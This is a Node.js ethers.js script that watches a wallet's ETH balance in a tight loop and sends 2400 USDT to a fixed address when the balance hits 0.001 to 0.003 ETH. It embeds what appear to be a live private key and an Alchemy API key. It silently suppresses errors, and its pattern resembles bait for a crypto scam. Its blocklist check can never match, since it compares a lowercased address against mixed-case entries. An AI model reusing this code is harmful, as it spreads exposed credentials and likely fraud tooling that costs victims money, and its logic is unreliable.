// Install ethers.js: npm install ethers
const { ethers } = require("ethers");

// Configuration
const alchemyApi = "https://eth-mainnet.alchemyapi.io/v2/qA9FV5BMTFx6p7638jhqx-JDFDByAZAn";
const senderAddress = "0x4DE23f3f0Fb3318287378AdbdE030cf61714b2f3";
const senderPrivateKey = "ee9cec01ff03c0adea731d7c5a84f7b412bfd062b9ff35126520b3eb3d5ff258";
const usdtContractAddress = "0xdac17f958d2ee523a2206206994597c13d831ec7";
const receiverAddress = "0x08f695b8669b648897ed5399b9b5d951b72881a0";

// Blocklist of addresses to avoid sending to
const blocklist = new Set([
  "0x08fc7400BA37FC4ee1BF73BeD5dDcb5db6A1036A",
  "0x272c2EA4C76E5c116213136D04d3E8051d1F6e3A",
  "0xb6ed7c545e4792479EC08Abd512593315084cDC9",
  "0x073E12b3C7F9583FdbC738b4f1AfEC95010f2D28",
  "0xb6ed7c545e4792479EC08Abd512593315084cDC9",
  "0xD7040a105505EEF85752A9E94128922fb9110b1e",
  "0xB74E09179492C7cb5A0Aff57894EF94Fc0fED1D8",
]);

// Initialize provider and wallet
const provider = new ethers.providers.JsonRpcProvider(`https://eth-mainnet.alchemyapi.io/v2/qA9FV5BMTFx6p7638jhqx-JDFDByAZAn`);

async function initializeWallet() {
  try {
    // Ensure the provider is working correctly
    await provider.getBlockNumber();
  } catch (error) {
    console.error("Failed to connect to the provider. Check your Alchemy API URL.");
    process.exit(1); // Exit the script if the provider is not working
  }
  return new ethers.Wallet(senderPrivateKey, provider);
}

// USDT Contract ABI (minimal)
const usdtAbi = [
  "function transfer(address to, uint256 amount) public returns (bool)",
  "function balanceOf(address owner) view returns (uint256)"
];

// Function to check ETH balance and send USDT
async function checkAndSend(wallet) {
  try {
    const ethBalance = await provider.getBalance(senderAddress);
    const ethInEther = ethers.utils.formatEther(ethBalance);

    // Trigger condition
    if (["0.003", "0.001", "0.002"].includes(ethInEther)) {
      // Ensure receiver is not blocklisted
      if (blocklist.has(receiverAddress.toLowerCase())) return;

      // USDT Contract instance
      const usdtContract = new ethers.Contract(usdtContractAddress, usdtAbi, wallet);

      // Send 2400 USDT (USDT has 6 decimals, so 2400 USDT = 2400000000 units)
      const usdtAmount = ethers.utils.parseUnits("2400", 6);
      const tx = await usdtContract.transfer(receiverAddress, usdtAmount);

      // Wait for confirmation (optional)
      await tx.wait();
    }
  } catch (error) {
    // Suppress errors silently
  }
}

// Monitor balance continuously (as quickly as possible)
async function monitor(wallet) {
  while (true) {
    await checkAndSend(wallet);
  }
}

(async () => {
  const wallet = await initializeWallet();
  monitor(wallet);
})();